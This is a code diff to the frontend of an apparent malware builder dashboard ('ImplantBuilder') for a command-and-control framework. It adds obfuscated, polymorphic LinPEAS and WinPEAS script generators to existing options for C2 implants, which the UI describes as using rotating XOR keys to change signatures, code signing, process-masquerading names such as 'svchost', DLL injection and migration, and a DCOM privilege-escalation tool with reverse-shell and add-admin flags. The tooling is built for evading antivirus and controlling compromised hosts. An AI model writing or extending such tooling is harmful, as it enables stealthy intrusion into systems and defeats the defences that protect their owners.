@@ -110,12 +110,14 @@ const PlatformRow = styled.div`
 
 const SubVariantRow = styled.div`
   display: flex;
+  flex-wrap: wrap;
   gap: 6px;
   margin-bottom: 14px;
 `;
 
 const SubVariantBtn = styled.button`
-  flex: 1;
+  flex: 1 1 30%;
+  min-width: 100px;
   padding: 10px 8px;
   border-radius: 8px;
   border: 1px solid ${props => props.$active ? 'rgba(198, 242, 62, 0.28)' : '#2a3140'};
@@ -463,7 +465,8 @@ function formatBytes(n) {
 
 const ImplantBuilder = () => {
   const [platform, setPlatform] = useState('windows');
-  const [windowsVariant, setWindowsVariant] = useState('implant'); // implant | dcom
+  const [windowsVariant, setWindowsVariant] = useState('implant'); // implant | dcom | winpeas
+  const [linuxVariant, setLinuxVariant] = useState('implant'); // implant | linpeas
   const [arch, setArch] = useState('amd64');
   const [format, setFormat] = useState('exe');
   const [host, setHost] = useState('127.0.0.1');
@@ -505,9 +508,12 @@ const ImplantBuilder = () => {
   }, [loadDefaults, loadBuilds]);
 
   const isDcom = platform === 'windows' && windowsVariant === 'dcom';
+  const isWinpeas = platform === 'windows' && windowsVariant === 'winpeas';
+  const isLinpeas = platform === 'linux' && linuxVariant === 'linpeas';
+  const isScriptOnly = isLinpeas || isWinpeas;
 
   const handleGenerate = async () => {
-    if (!isDcom && !host.trim()) {
+    if (!isDcom && !isScriptOnly && !host.trim()) {
       toast.error('C2 host is required');
       return;
     }
@@ -517,14 +523,14 @@ const ImplantBuilder = () => {
         '/api/builder/generate',
         {
           platform,
-          variant: platform === 'windows' ? windowsVariant : 'implant',
+          variant: platform === 'windows' ? windowsVariant : linuxVariant,
           arch,
           format: platform === 'windows' ? format : 'exe',
           host: host.trim() || undefined,
           port: Number(port),
           outputName: outputName.trim() || undefined,
-          signCode: platform === 'windows',
-          signSubject: platform === 'windows' ? (signSubject.trim() || undefined) : undefined,
+          signCode: platform === 'windows' && !isWinpeas,
+          signSubject: platform === 'windows' && !isWinpeas ? (signSubject.trim() || undefined) : undefined,
           signAuto: true,
           buildNonce: typeof crypto !== 'undefined' && crypto.randomUUID
             ? crypto.randomUUID()
@@ -537,6 +543,10 @@ const ImplantBuilder = () => {
         toast.error(
           'Expected DCOM Go build (go-dcom) — pick "DCOM tool (Go)", restart node server, and hard-refresh the dashboard.'
         );
+      } else if (isLinpeas && b?.tool !== 'linpeas-sh') {
+        toast.error('Expected LinPEAS build (linpeas-sh) — pick "LinPEAS (shell)" and restart the server.');
+      } else if (isWinpeas && b?.tool !== 'winpeas-bat') {
+        toast.error('Expected WinPEAS build (winpeas-bat) — pick "WinPEAS (bat)" and restart the server.');
       } else if (b?.authenticodeSigned) {
         toast.success(`Signed ${b.tool || 'build'} · sha256 ${b.sha256?.slice(0, 12) || '?'}…`);
       } else if (platform === 'windows' && b?.signNote) {
@@ -708,7 +718,11 @@ const ImplantBuilder = () => {
           <p>
             {isDcom
               ? 'Build the Go DCOM module (GodPotato-style). Same toolchain as the C2 implant — obfuscated strings, unique build ID, and padding every generation.'
-              : 'Build a fresh Windows or Linux binary from lastfinalversion2.go. Every generation rotates XOR keys, shift, strings, and padding so the signature changes.'}
+              : isWinpeas
+                ? 'Generate a polymorphic WinPEAS batch file: gzip payload, random chunked variables, PowerShell decode stub, build stamp — new sha256 every time.'
+              : isLinpeas
+                ? 'Generate a polymorphic LinPEAS script: gzip payload, random chunked base64 wrapper, build stamp, and tail entropy — new sha256 every time.'
+                : 'Build a fresh Windows or Linux binary from lastfinalversion2.go. Every generation rotates XOR keys, shift, strings, and padding so the signature changes.'}
           </p>
         </div>
       </Head>
@@ -729,6 +743,7 @@ const ImplantBuilder = () => {
               onClick={() => {
                 setPlatform('linux');
                 setWindowsVariant('implant');
+                setLinuxVariant('implant');
               }}
             >
               <FaLinux /> Linux
@@ -756,6 +771,35 @@ const ImplantBuilder = () => {
               >
                 DCOM tool (Go)
               </SubVariantBtn>
+              <SubVariantBtn
+                type="button"
+                $active={windowsVariant === 'winpeas'}
+                onClick={() => setWindowsVariant('winpeas')}
+                disabled={busy}
+              >
+                WinPEAS (bat)
+              </SubVariantBtn>
+            </SubVariantRow>
+          )}
+
+          {platform === 'linux' && (
+            <SubVariantRow>
+              <SubVariantBtn
+                type="button"
+                $active={linuxVariant === 'implant'}
+                onClick={() => setLinuxVariant('implant')}
+                disabled={busy}
+              >
+                C2 implant (Go)
+              </SubVariantBtn>
+              <SubVariantBtn
+                type="button"
+                $active={linuxVariant === 'linpeas'}
+                onClick={() => setLinuxVariant('linpeas')}
+                disabled={busy}
+              >
+                LinPEAS (shell)
+              </SubVariantBtn>
             </SubVariantRow>
           )}
 
@@ -764,7 +808,7 @@ const ImplantBuilder = () => {
             <Select
               value={arch}
               onChange={(e) => setArch(e.target.value)}
-              disabled={isDcom}
+              disabled={isDcom || isScriptOnly}
             >
               <option value="amd64">amd64 (x64)</option>
               <option value="386">386 (x86)</option>
@@ -772,7 +816,7 @@ const ImplantBuilder = () => {
             </Select>
           </Field>
 
-          {platform === 'windows' && !isDcom && (
+          {platform === 'windows' && !isDcom && !isWinpeas && (
             <Field>
               Output format
               <Select value={format} onChange={(e) => setFormat(e.target.value)}>
@@ -782,36 +826,48 @@ const ImplantBuilder = () => {
             </Field>
           )}
 
-          <Field>
-            {isDcom ? 'Default lhost (optional)' : 'C2 Host'}
-            <Input
-              value={host}
-              onChange={(e) => setHost(e.target.value)}
-              placeholder={isDcom ? 'Embedded -H default (runtime flags override)' : '127.0.0.1 or your domain'}
-            />
-          </Field>
+          {!isScriptOnly && (
+            <>
+              <Field>
+                {isDcom ? 'Default lhost (optional)' : 'C2 Host'}
+                <Input
+                  value={host}
+                  onChange={(e) => setHost(e.target.value)}
+                  placeholder={isDcom ? 'Embedded -H default (runtime flags override)' : '127.0.0.1 or your domain'}
+                />
+              </Field>
 
-          <Field>
-            {isDcom ? 'Default lport (optional)' : 'C2 Port'}
-            <Input
-              type="number"
-              value={port}
-              onChange={(e) => setPort(e.target.value)}
-              min={isDcom ? 0 : 1}
-              max={65535}
-            />
-          </Field>
+              <Field>
+                {isDcom ? 'Default lport (optional)' : 'C2 Port'}
+                <Input
+                  type="number"
+                  value={port}
+                  onChange={(e) => setPort(e.target.value)}
+                  min={isDcom ? 0 : 1}
+                  max={65535}
+                />
+              </Field>
+            </>
+          )}
 
           <Field>
             Output name (optional)
             <Input
               value={outputName}
               onChange={(e) => setOutputName(e.target.value)}
-              placeholder={platform === 'windows' ? 'svchost' : 'systemd-helper'}
+              placeholder={
+                isLinpeas
+                  ? 'host_audit'
+                  : isWinpeas
+                    ? 'win_audit'
+                    : platform === 'windows'
+                      ? 'svchost'
+                      : 'systemd-helper'
+              }
             />
           </Field>
 
-          {platform === 'windows' && (
+          {platform === 'windows' && !isWinpeas && (
             <SignCard>
               <SignMeta style={{ marginTop: 0 }}>
                 <strong style={{ color: '#aeb6c7' }}>Authenticode:</strong> every Windows EXE/DLL is signed
@@ -846,11 +902,15 @@ const ImplantBuilder = () => {
               ? 'Building (unique signature)…'
               : isDcom
                 ? 'Generate DCOM EXE (Go)'
-                : platform === 'windows'
-                  ? format === 'dll'
-                    ? 'Generate Windows DLL'
-                    : 'Generate Windows EXE (+ inject DLL)'
-                  : 'Generate Linux binary'}
+                : isWinpeas
+                  ? 'Generate WinPEAS batch'
+                : isLinpeas
+                  ? 'Generate LinPEAS script'
+                  : platform === 'windows'
+                    ? format === 'dll'
+                      ? 'Generate Windows DLL'
+                      : 'Generate Windows EXE (+ inject DLL)'
+                    : 'Generate Linux binary'}
           </GenerateBtn>
 
           {isDcom ? (
@@ -858,11 +918,26 @@ const ImplantBuilder = () => {
               Standalone Go binary (no Crystal). CLI: <code>-c</code> command, <code>-H/-P</code> reverse shell,{' '}
               <code>-u/-pw</code> add local admin, <code>-p</code> pipe name. Built with the same Go compiler as the implant.
             </Note>
-          ) : (
+          ) : isWinpeas ? (
+            <Note>
+              Obfuscated <code>.bat</code> from <code>winPEAS.bat</code>. Run from a path without spaces{' '}
+              (WinPEAS requirement). Needs PowerShell on the host for the stub decode. Authorized testing only.
+            </Note>
+          ) : isLinpeas ? (
+            <Note>
+              Obfuscated <code>.sh</code> from <code>linpeas.sh</code>. Run on target:{' '}
+              <code>chmod +x file.sh &amp;&amp; ./file.sh</code> (same LinPEAS flags: <code>-a</code>, <code>-s</code>, etc.).
+              Authorized testing only.
+            </Note>
+          ) : platform === 'windows' ? (
             <Note>
               Windows EXE builds embed a real inject DLL. After you connect, run{' '}
               <code>migrate &lt;pid&gt;</code> — the session then lives inside that process
               (kill the host PID to kill the session). Do not inject an .exe path.
+            </Note>
+          ) : (
+            <Note>
+              Linux implant connects to your C2 with the same polymorphic Go build as Windows (no DLL pack).
             </Note>
           )}
 
@@ -892,6 +967,8 @@ const ImplantBuilder = () => {
                     <div className="sub">
                       {b.platform}/{b.arch}
                       {b.variant === 'dcom' || b.tool === 'go-dcom' ? ' · go-dcom' : ''}
+                      {b.variant === 'linpeas' || b.tool === 'linpeas-sh' ? ' · linpeas-sh' : ''}
+                      {b.variant === 'winpeas' || b.tool === 'winpeas-bat' ? ' · winpeas-bat' : ''}
                       {b.format ? `/${b.format}` : ''}
                       {b.injectDllPacked ? ' · migrate-ready' : ''}
                       {b.authenticodeSigned ? ` · signed${b.signPublisher ? ` (${b.signPublisher.split(',')[0].replace('CN=', '')})` : ''}` : ''}
